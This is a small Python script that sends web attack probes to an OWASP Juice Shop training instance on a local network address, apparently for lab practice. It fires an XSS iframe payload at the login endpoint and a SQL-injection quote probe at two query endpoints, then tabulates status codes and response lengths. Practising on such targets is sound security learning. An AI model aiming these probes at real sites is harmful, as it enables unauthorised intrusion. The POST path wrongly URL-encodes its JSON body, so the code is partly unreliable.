import requests
import urllib

JUICE_SHOP_URL = "http://192.168.1.119:3000"

def send_request(endpoint, command, payload, headers = None):
    url = f"{JUICE_SHOP_URL}{endpoint}"

    payload = urllib.parse.quote(payload)

    try:
        if "POST" == command:
            headers = {"Content-Type": "application/json"}
            response = requests.post(url, data=payload, headers=headers, timeout=10)
        elif "GET" == command:
            response = requests.get(url + payload, timeout=10)
    except requests.RequestException as e:
        print(f"Unable to connect or send request to server. Error: {e}")
        return None

    return response

def scan_endpoints():
    endpoints = [
        {"endpoint": "/rest/user/login", "command": "POST", "payload": "{\"email\": \"<iframe src=javascript:alert(1)>\", \"password\": \"any_password\"}"},
        {"endpoint": "/track-result?id=", "command": "GET", "payload": "';"},
        {"endpoint": "/rest/products/search?q=", "command": "GET", "payload": "';"}
    ]

    print(f"{'Endpoint':<30} | {'HTTP Method':<15} | {'Payload':<80} | {'Status Code':<15} | {'Response Length':<15}")
    print("-" * 170)
    
    for endpoint in endpoints:
        response = send_request(endpoint["endpoint"], endpoint["command"], endpoint["payload"])
        if response is not None:
            print(f"{endpoint['endpoint']:<30} | {endpoint['command']:<15} | {endpoint['payload']:<80} | {response.status_code:<15} | {len(response.text):<15}")

if __name__ == '__main__':
    scan_endpoints()